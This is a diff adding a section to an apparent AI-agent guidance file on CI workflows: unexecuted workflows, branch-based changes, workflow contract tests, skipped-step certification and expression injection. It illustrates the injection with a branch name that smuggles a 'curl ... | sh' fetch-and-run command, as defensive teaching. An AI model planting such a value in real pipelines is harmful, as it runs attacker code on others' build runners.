@@ -303,6 +303,22 @@ flowchart LR
    - **Never make a check green by weakening the check.** No `--no-verify`, no force-push over a shared branch, no `continue-on-error` added to a job that just failed, no deleting the assertion. If a gate is genuinely wrong, fix the gate in its own commit and say so.
    - **Code scanning is part of the run.** After the SARIF upload lands, read the alerts the change introduced (`gh api repos/:owner/:repo/code-scanning/alerts --jq '.[] | select(.state=="open") | .rule.id'`) and either fix them or record why they stand. An alert nobody reads is the CI log this repository built SARIF to escape.
 
+11. **A Workflow With Zero Runs Is Unverified Code**:
+   - Count the runs before trusting a workflow. Three of this repository's five had never executed once — `pr-sentinel.yml` and `recursive-hardening.yml` fire on `pull_request`, `autonomous-triage.yml` on `issues`, and across the repository's entire history there were **zero pull requests and zero issues** while `ci.yml` accumulated 83 runs. Every commit had gone straight to `main`.
+
+     ```bash
+     gh api repos/:owner/:repo/actions/workflows --jq '.workflows[] | [.path, (.id|tostring)] | @tsv' |
+       while IFS=$'\t' read -r path id; do
+         printf 'runs=%-4s %s\n' "$(gh api "repos/:owner/:repo/actions/workflows/$id/runs" --jq .total_count)" "$path"
+       done
+     ```
+
+   - **Committing straight to `main` is what keeps them dead.** It is not merely a process preference: the pull-request lifecycle in §8 is the trigger for half the automation, so an agent that only ever pushes to `main` disables the sentinel that certifies its diffs and the loop that audits its hardening. Substantive changes go through a branch and a pull request, which is also the only way to find out whether those workflows work.
+   - **Nothing else reads workflow code.** `actionlint` checks that the YAML and the shell are well-formed; it does not know that `verify-hardening --diff-file --is-defect` is a command the tool accepts. [`tests/test_workflow_contracts.py`](./tests/test_workflow_contracts.py) resolves every workflow's command line against the target script's own argument parser, and pins the rules below. Add to it whenever a workflow grows a new dependency on the tree.
+   - **Never interpolate `${{ }}` inside a `run:` block.** Actions substitutes expressions before bash parses anything, and Git permits `;`, `$`, `(`, `)`, `|` and backticks in a ref name — so `git diff origin/${{ github.base_ref }}` on a branch named `x;curl host.example.com|sh` is two commands on the runner. Pass values through `env:`, where they reach the process instead of its source. This rule existed in `autonomous-triage.yml` as a comment and was absent from the other two workflows, which is what an unexecuted file accumulates.
+   - **A skipped step is not a passed step.** `pr-sentinel.yml` guarded its audit on `files_count > 0` and then applied a `certified-by-sentinel` label under `if: success()`, so a documentation-only pull request was labelled certified by an audit that never ran — [Observation 11](./observations/systems/11-silent-certification-failure-and-gate-integrity.md)'s failure mode, inside the workflow named after the sentinel. Either run the step unconditionally and let it report that it had nothing to do, or make the downstream step require `steps.<id>.outcome == 'success'`.
+   - **A CLI path only CI invokes is a path only CI tests.** `sentinel.py` with no arguments scanned `node_modules` and exited non-zero on a vendored package. No workflow and no hook ever invoked it that way — CI passes explicit directories and pre-commit passes filenames — so the one entry point a contributor would reach for first was the one nothing covered. Assert the exit code of every documented invocation, not only the ones automation happens to use.
+
 ---
 
 ## 9. Autonomous Innovative Self-Improvement & Mandatory Roadmap Evolution
